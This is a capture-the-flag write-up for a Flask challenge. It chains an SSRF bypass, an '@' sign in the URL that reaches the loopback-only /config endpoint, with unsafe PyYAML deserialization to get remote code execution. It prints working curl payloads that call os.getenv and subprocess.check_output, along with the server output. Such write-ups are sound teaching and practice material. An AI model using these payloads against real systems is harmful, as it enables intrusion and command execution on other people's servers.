# Solution

The web app gives us three endpoints:
- `/docs` (source is revealed)
- `/manage` (UI management that issues HTTP requests)
- `/config` (Configuration UI only allowed from loopback)

The source reveals that RCE is present via YAML deserialization attack in `config` function under `/config` endpoint:
```python
...
ip = IPv4Address(request.remote_addr)
if not ip.is_loopback:
	flash("Configuration is available only from the same host for your security")
	return redirect(url_for('index'))

if request.method == "POST":
	if "config" in request.values:
		config = dict(**yaml.load(request.values["config"], Loader=yaml.Loader))
...
```

But the endpoint is also not reachable if the IP is not from localhost. Luckily, we have the `/manage` endpoint which issues HTTP requests. Let's see if we can abuse it to issue requests from that endpoint back to the `/config` endpoint:
```python
@app.route("/manage", methods=["GET", "POST"])
def manage():
	global app_config
	response_out = ""
	if request.method == "POST":
		try:
			response = requests.request(
				request.values["method"],
				url="http://" + app_config.device_host + request.values["url"],
				data=request.values["body"].encode(),
				headers={'Content-Type': 'application/x-www-form-urlencoded'},
				timeout=5)
		...
```

At first glance, it seems that we cannot do anything since the `app_config.device_host` is used to specify the hostname, but there is a well known bypass for this by using an `@` sign, making the `app_config.device_host` considered as credentials for basic authentication and, luckily, our input comes right after `app_config.device_host` which is not terminated to represent it as the authority part of the URL.

Therefore, to fully exploit this web app, we must craft an RCE payload:
```json
{"orchestrator_id": !!python/object/apply:os.getenv [FLAG]}
```

Then issue the request to `/config` via `/manage`:
```sh
$ curl -sS http://localhost:8080/manage -d 'method=POST&url=%40127.0.0.1%3A8080%2Fconfig&body=config%3D{"orchestrator_id": !!python/object/apply:os.getenv [FLAG]}' | grep ibctf
    &lt;p name=&#34;config_out&#34;&gt;{&amp;#39;orchestrator_id&amp;#39;: &amp;#39;ibctf{st1ll_H4Z-th3-s4m3-py1ssuezz}&amp;#39;}&lt;/p&gt;
```

Observe how we specify the URL: `@127.0.0.1:8080/config`.

You can also leverage full RCE with `subprocess.check_output`:

```sh
curl -sS http://localhost:8080/manage -d 'method=POST&url=%40127.0.0.1%3A8080%2Fconfig&body=config%3D{"orchestrator_id": !!python/object/apply:subprocess.check_output [!!str "id"]}'

...
&lt;textarea name=&#34;config&#34; id=&#34;config&#34;&gt;{&amp;#34;orchestrator_id&amp;#34;: !!python/object/apply:subprocess.check_output [!!str &amp;#34;id&amp;#34;]}&lt;/textarea&gt;
    &lt;label for=&#34;config_out&#34;&gt;Current config&lt;/label&gt;
    &lt;input type=&#34;submit&#34; value=&#34;Save&#34;&gt;
    &lt;p name=&#34;config_out&#34;&gt;{&amp;#39;orchestrator_id&amp;#39;: b&amp;#39;uid=999(ctf) gid=999(ctf) groups=999(ctf)\n&amp;#39;}&lt;/p&gt;
...
```
